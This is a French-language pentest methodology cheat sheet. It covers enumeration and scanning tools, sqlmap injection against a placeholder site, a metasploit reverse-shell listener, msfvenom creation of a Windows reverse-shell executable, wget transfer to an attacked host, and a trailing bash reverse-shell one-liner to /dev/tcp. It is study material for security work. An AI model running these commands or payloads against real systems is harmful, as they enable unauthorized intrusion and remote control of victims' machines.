---
title:  "Pentest Web"
tag: "Méthodologie"
---

Ces notes sont destinées à répertorier une méthodologie pour du pentest web.

# Collecte d'informations

## Identification de sous domaines
```console
Misoko@home[/home]$ sublist3r -d google.com
Misoko@home[/home]$ gobuster dns -d google.com -w ~/wordlists/subdomains.txt -i
```
On peut utiliser également https://crt.sh/ avec "%.domain.com"

## Recherche / Enumération de dossiers et fichiers
Une fois le périmètre défini, une utilisation d'outils de bruteforce de répertoire peut permettre d'identifier les fichiers et dossiers du domaine de périmètre. Une fois les résultats obtenus, l'identification de la technologie utilisée peut être faite.

### [Gobuster](https://github.com/OJ/gobuster)
```console
Misoko@home[/home]$ gobuster dir -u http://@IP --wordlist /usr/share/dirb/wordlists/common.txt
```

On peut accéder ici à de nombreuses listes avec [SecLists](https://github.com/danielmiessler/SecLists).

## Identifier les Technologies utilisées

### [wappalyzer](https://www.wappalyzer.com/)
Cet outil permet de se faire une première idée des technologies liés à un nom de domaine, directement depuis l'interface web.

### [similartech](https://www.similartech.com/)
Un autre outil dans le même état d'esprit.

## whatweb
```console
Misoko@home[/home]$ whatweb domain.com -v -a 3
```


# Scanners Automatique
### [nikto](https://github.com/sullo/nikto)
Nikto est un scanner de serveur web (configuration, version de serveurs obsolète, options HTTP du serveur, identification du serveur web, vulnérabilités, etc). Un [guide](https://www.freecodecamp.org/news/an-introduction-to-web-server-scanning-with-nikto/) pratique pour débuter.

```console
Misoko@home[/home]$ nikto -h scanme.nmap.org -o scan.txt
Misoko@home[/home]$ nikto -h domains.txt
Misoko@home[/home]$ nikto -h https://nmap.org -ssl
Misoko@home[/home]$ nikto -h @IP
```


nikto, whatweb, wapiti, w3af, zaproxy, nuclei
## cmsScan

# HTTP Headers 
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/

# Recherche d'exploits

```console
Misoko@home[/home]$ searchsploit apache 2.4.41 
```

Recherche google
```console
frameworkName exploit/cve/metasploit
framework cve /metasploit
```

# Injection SQL
### SQLmap
Après avoir trouvé un lien où il y a une injection du type : http://vulnWebsite.com/article.php?id=2
```console
Misoko@home[/home]$ sqlmap -u http://vulnWebsite.com/article.php?id=2 --dbs
Misoko@home[/home]$ sqlmap -u http://vulnWebsite.com/article.php?id=2 -D databaseName
```

# Utilisation metasploit

```console
$ msfconsole
$ use exploit/multi/handler
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.5
msf6 exploit(multi/handler) > set lport 1234
msf6 exploit(multi/handler) > exploit
```

## Creation de shell
```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > Desktop/stageless_reverse_tcp_x86_4444_2.exe
```

# Echange de fichier :
```console
Misoko@home[/home]$ python3 -m http.server
```
et de l'autre côté :
```console
attackedHost@home[/home]$ wget http://@IP/file
```

<!--
À checker

https://marduc812.com/2019/08/18/web-application-testing-methodology/

https://marduc812.com/checklist/web.html
  -->




  bash -i >& /dev/tcp/10.18.17.129/4444 0>&1